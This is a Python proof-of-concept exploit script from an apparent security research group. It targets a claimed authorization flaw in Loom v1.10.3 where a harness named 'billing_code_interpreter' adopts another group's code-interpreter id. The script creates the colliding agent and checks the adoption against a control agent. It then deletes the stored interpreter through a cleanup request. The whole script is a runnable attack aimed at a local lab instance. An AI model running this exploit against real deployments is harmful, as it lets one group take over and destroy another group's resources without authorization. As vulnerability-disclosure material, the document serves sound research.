#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: loom-ci-name-adopt (High: 7.6)
#  Vendor: Loom (AWS)
#  Versions: Loom v1.10.3
#  Impact: agent admin adopts another group's code interpreter and can delete it on cleanup
#  Requires: Docker, loopback only, public tag checkout
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "loom-ci-name-adopt"
_EMAIL = "abraxas.null@proton.me"

_RST = "\033[0m"
_BLD = "\033[1m"
_CYAN = (0, 255, 249)
_MAGENTA = (255, 0, 212)
_PINK = (255, 77, 224)
_GREEN = (57, 255, 20)
_GOLD = (255, 230, 0)
_AMBER = (255, 201, 70)
_RED = (255, 64, 96)
_MUTED = (140, 155, 175)
_INK = (232, 255, 248)
_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    if not _on():
        return ""
    return f"\033[38;2;{r};{g};{b}m"


def _paint(text, rgb, bold=False):
    if not text or rgb is None:
        return text or ""
    prefix = _rgb(*rgb) + (_BLD if bold else "")
    return "".join(ch if ch == " " else prefix + ch for ch in text)


def _box(inner, border):
    edge = _rgb(*border) + "║" + _RST
    return edge + " " + inner + _RST + " " + edge


def _rule(left, right, border, width):
    return _rgb(*border) + left + "═" * (width - 2) + right + _RST


def _split(text, left_end, right_start, left_rgb, right_rgb, mid_rgb=None, left_bold=False):
    return (
        _paint(text[:left_end], left_rgb, bold=left_bold)
        + _paint(text[left_end:right_start], mid_rgb)
        + _paint(text[right_start:], right_rgb)
    )


def _fit(left, right, width, fill=" "):
    gap = max(width - len(left) - len(right), 1)
    return (left + fill * gap + right)[:width].ljust(width)


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line):
    width = max(len(line), 1)
    out = []
    quoted = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        quoted ^= ch == '"'
        if ch == '"':
            color = _AMBER if quoted else _GOLD
        elif quoted:
            color = _GOLD
        else:
            color = _rain(x, width)
        out.append(_rgb(*color) + ch)
    return "".join(out) + _RST


def _banner_width(cols):
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(row) for row in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    return content_w, box_w


def _title_row(width):
    left, right = " ABRAXAS LABS", "analyze · reverse · disclose"
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _CYAN, _MUTED, left_bold=True)


def _cve_row(width):
    left, right = " " + _CVE, "authorized research only"
    rest = max(width - len(left) - len(right), 3)
    text = (left + " local lab ".center(rest)[:rest] + right)[:width].ljust(width)
    return _split(text, len(left), width - len(right), _PINK, _GREEN, mid_rgb=_MAGENTA, left_bold=True)


def _mail_row(width):
    left, right = " Mail", _EMAIL
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _GOLD, _CYAN)


def _status_line():
    marks = {"[": _GREEN, "]": _GREEN, "*": _GREEN, "·": _PINK, "#": _PINK}
    text = "[*]  abraxas!null ready on #labs"
    return "".join(ch if ch == " " else _rgb(*marks.get(ch, _INK)) + ch for ch in text) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    content_w, box_w = _banner_width(cols)
    lines = [
        _rule("╔", "╗", _CYAN, box_w),
        _box(_title_row(content_w) + _RST, _CYAN),
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_cve_row(content_w) + _RST, _MAGENTA),
        _rule("╠", "╣", _MAGENTA, box_w),
    ]
    for glyph in _ART["abraxas"] + _ART["labs"]:
        vis = glyph[:content_w].ljust(content_w)
        lines.append(_box(_logo_line(vis), _MAGENTA))
    lines.extend([
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_mail_row(content_w) + _RST, _MAGENTA),
        _rule("╚", "╝", _CYAN, box_w),
        " " + _status_line(),
    ])
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _message_color(s):
    low = s.lower()
    stripped = s.lstrip()
    if low.startswith("success"):
        return _rgb(*_GREEN) + _BLD
    if low.startswith("fail"):
        return _rgb(*_RED) + _BLD
    if "user_id" in low:
        return _rgb(*_AMBER) + _BLD
    if low.startswith("status=") or "status=" in low[:20]:
        return _rgb(*_CYAN)
    if low.startswith("carrier"):
        return _rgb(*_MAGENTA)
    if stripped[:1] in "{[":
        return _rgb(*_GOLD)
    return _rgb(*_INK)


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    dest = kwargs.get("file", _sys.stdout)
    if dest is not _sys.stdout and dest is not _sys.stderr:
        _PRINT(*args, **kwargs)
        return
    extra = {k: v for k, v in kwargs.items() if k != "sep"}
    _PRINT(_message_color(s) + s + _RST, **extra)

print_abraxas_banner()
_PRINT = _builtins.print
_builtins.print = _cprint

"""Loom v1.10.3 harness code-interpreter names collide after a suffix strip.

A harness named billing_code_interpreter reuses the interpreter id already
stored for a harness named billing. Payroll, a different base name, must not.
"""

import json
import os
import time
import urllib.error
import urllib.request
from dataclasses import dataclass
from pathlib import Path

LABEL = "LOOM-1103-CI-ADOPT"
WITNESS = "LOOM-1103-CI-ADOPT-WITNESS"
CI_ID = "ci-billing-existing"
COLLIDE_NAME = "billing_code_interpreter"
CONTROL_NAME = "payroll"
MODEL_ID = "us.amazon.nova-lite-v1:0"
TOKEN = "lab-demo"
LOOM_URL = os.environ.get("LOOM_URL", "http://127.0.0.1:18810").rstrip("/")
SEED_PATH = Path(os.environ.get("LAB_SEED", "/lab/seed.json"))
CREATED_PATH = Path(os.environ.get("LAB_CREATED", "/lab/capture/created.json"))
DELETED_PATH = Path(os.environ.get("LAB_DELETED", "/lab/capture/deleted.json"))
TERMINAL = {"READY", "deployed", "failed", "credential_creation_failed"}
FAILED = {"failed", "credential_creation_failed"}


@dataclass(frozen=True)
class HttpResult:
    status: int
    body: str

    def json(self) -> object | None:
        try:
            return json.loads(self.body)
        except json.JSONDecodeError:
            return None


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(detail: str) -> int:
    log(f"FAIL {LABEL} {detail} {WITNESS}")
    return 1


def success(detail: str) -> int:
    log(f"SUCCESS {LABEL} {detail} {WITNESS}")
    return 0


def http(
    method: str,
    path: str,
    payload: dict[str, object] | None = None,
    token: str | None = None,
) -> HttpResult:
    url = path if path.startswith("http") else f"{LOOM_URL}{path}"
    data: bytes | None = None
    headers = {"Accept": "application/json"}
    if payload is not None:
        data = json.dumps(payload).encode("utf-8")
        headers["Content-Type"] = "application/json"
    elif method in ("POST", "PUT"):
        data = b""
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=60) as resp:
            return HttpResult(int(resp.status), resp.read().decode("utf-8", "replace"))
    except urllib.error.HTTPError as exc:
        return HttpResult(int(exc.code), exc.read().decode("utf-8", "replace"))
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        return HttpResult(0, str(exc))


def as_int(value: object) -> int | None:
    if isinstance(value, bool) or not isinstance(value, int):
        return None
    return value


def as_dict(value: object) -> dict[str, object] | None:
    if not isinstance(value, dict):
        return None
    return {str(key): item for key, item in value.items()}


def clipped(body: str) -> str:
    flat = " ".join(body.split())
    if WITNESS in flat:
        return "response-contained-witness"
    return flat[:300]


def string_list(path: Path) -> list[str]:
    if not path.is_file():
        return []
    try:
        loaded = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return []
    if not isinstance(loaded, list):
        return []
    return [item for item in loaded if isinstance(item, str)]


def wait_seed() -> dict[str, object]:
    for attempt in range(1, 61):
        if SEED_PATH.is_file():
            try:
                loaded = json.loads(SEED_PATH.read_text(encoding="utf-8"))
            except (OSError, json.JSONDecodeError):
                loaded = None
            data = as_dict(loaded)
            billing_id = as_int(data.get("billing_agent_id")) if data is not None else None
            role_id = as_int(data.get("role_id")) if data is not None else None
            if data is not None and billing_id and role_id:
                log(f"ioc seed-ready attempt={attempt} billing_agent_id={billing_id}")
                return data
        log(f"ioc seed-wait attempt={attempt}")
        time.sleep(1)
    raise RuntimeError("missing-seed")


def harness_body(name: str, role_arn: str, role_id: int) -> dict[str, object]:
    # The code-interpreter role branch reads memory_records, which is bound
    # only when memory_ids is non-empty. An unknown id binds the name and
    # attaches nothing.
    return {
        "source": "harness",
        "name": name,
        "model_id": MODEL_ID,
        "provider": "bedrock",
        "role_arn": role_arn,
        "code_interpreter_enabled": True,
        "code_interpreter_role_id": role_id,
        "memory_ids": [0],
        "tags": {
            "loom:group": "demo",
            "loom:application": "lab",
            "loom:owner": "lab",
        },
    }


def poll_row(agent_id: int) -> dict[str, object] | str:
    last_status = ""
    last_ci = ""
    for attempt in range(1, 41):
        res = http("GET", f"/api/agents/{agent_id}", token=TOKEN)
        row = as_dict(res.json())
        if row is None:
            log(
                f"ioc poll id={agent_id} attempt={attempt} http={res.status}"
                f" body={clipped(res.body)}"
            )
            if clipped(res.body) == "response-contained-witness":
                return "response-contained-witness"
            time.sleep(0.5)
            continue
        ci = row.get("code_interpreter_id")
        dep = str(row.get("deployment_status") or "")
        last_status = dep
        last_ci = ci if isinstance(ci, str) else ""
        runtime = row.get("runtime_id")
        log(
            f"ioc poll id={agent_id} attempt={attempt} http={res.status}"
            f" deployment_status={dep or '-'} code_interpreter_id={last_ci or '-'}"
            f" runtime_id={'set' if runtime else 'empty'}"
        )
        if dep in TERMINAL and last_ci:
            return row
        if dep in FAILED:
            return f"deploy-failed status={dep} code_interpreter_id={last_ci or '-'}"
        time.sleep(0.5)
    return (
        f"poll-timeout status={last_status or '-'} code_interpreter_id={last_ci or '-'}"
    )


def main() -> int:
    health = http("GET", "/health")
    log(f"ioc health-http={health.status} body={clipped(health.body)}")
    if clipped(health.body) == "response-contained-witness":
        return fail("response-contained-witness")
    if health.status != 200:
        return fail(f"health-http={health.status}")

    try:
        seed = wait_seed()
    except RuntimeError:
        return fail("missing-seed")
    billing_id = as_int(seed.get("billing_agent_id"))
    role_id = as_int(seed.get("role_id"))
    role_arn = seed.get("role_arn")
    if (
        billing_id is None
        or role_id is None
        or not isinstance(role_arn, str)
        or seed.get("code_interpreter_id") != CI_ID
        or seed.get("billing_group") != "payments"
    ):
        return fail("seed-mismatch")

    hidden = http("GET", f"/api/agents/{billing_id}", token=TOKEN)
    hidden_body = clipped(hidden.body)
    leaked = CI_ID in hidden.body
    log(
        f"ioc billing-get={hidden.status} body-has-ci-id={'yes' if leaked else 'no'}"
        f" body={hidden_body}"
    )
    if hidden_body == "response-contained-witness":
        return fail("response-contained-witness")
    if hidden.status != 403:
        return fail(f"billing-get={hidden.status}")

    created = http(
        "POST",
        "/api/agents",
        payload=harness_body(COLLIDE_NAME, role_arn, role_id),
        token=TOKEN,
    )
    created_row = as_dict(created.json())
    created_id = as_int(created_row.get("id")) if created_row else None
    log(
        f"ioc collide-create-http={created.status} id={created_id if created_id else '-'}"
        f" body={clipped(created.body)}"
    )
    if clipped(created.body) == "response-contained-witness":
        return fail("response-contained-witness")
    if created.status != 201 or created_id is None:
        return fail(f"collide-create-http={created.status}")

    collide = poll_row(created_id)
    if isinstance(collide, str):
        log(f"ioc collide-result {collide}")
        return fail(collide if collide.startswith("deploy-failed") else collide)
    collide_ci = collide.get("code_interpreter_id")
    collide_runtime = collide.get("runtime_id")
    log(
        f"ioc collide-stored code_interpreter_id={collide_ci}"
        f" deployment_status={collide.get('deployment_status')}"
        f" runtime_id={'set' if collide_runtime else 'empty'}"
    )
    if collide_ci != CI_ID:
        return fail(f"collide-id={collide_ci or '-'}")

    control = http(
        "POST",
        "/api/agents",
        payload=harness_body(CONTROL_NAME, role_arn, role_id),
        token=TOKEN,
    )
    control_row = as_dict(control.json())
    control_id = as_int(control_row.get("id")) if control_row else None
    log(f"ioc payroll-create-http={control.status} id={control_id if control_id else '-'}")
    if control.status != 201 or control_id is None:
        return fail(f"payroll-create-http={control.status}")

    payroll = poll_row(control_id)
    if isinstance(payroll, str):
        log(f"ioc payroll-result {payroll}")
        return fail(payroll)
    payroll_ci = payroll.get("code_interpreter_id")
    created_names = string_list(CREATED_PATH)
    log(
        f"ioc payroll-stored code_interpreter_id={payroll_ci or '-'}"
        f" created-names={','.join(created_names) or '-'}"
    )
    if not isinstance(payroll_ci, str) or not payroll_ci or payroll_ci == CI_ID:
        return fail(f"payroll-id={payroll_ci or '-'}")

    deleted_flag = "skipped"
    if collide_runtime:
        DELETED_PATH.unlink(missing_ok=True)
        deleted = http("DELETE", f"/api/agents/{created_id}?cleanup_aws=true", token=TOKEN)
        removed = string_list(DELETED_PATH)
        recorded = CI_ID in removed
        deleted_flag = "yes" if recorded else "no"
        log(
            f"ioc cleanup-http={deleted.status} deleted-ids={','.join(removed) or '-'}"
            f" stored-id-deleted={'yes' if recorded else 'no'}"
        )
        if clipped(deleted.body) == "response-contained-witness":
            return fail("response-contained-witness")
        if deleted.status != 200 or not recorded:
            return fail(f"cleanup-http={deleted.status} stored-id-deleted={deleted_flag}")
    else:
        log("ioc cleanup-skipped runtime_id=empty")

    return success(
        f"adopted={CI_ID} payroll-distinct=yes cleanup-deleted={deleted_flag}"
    )


if __name__ == "__main__":
    raise SystemExit(main())

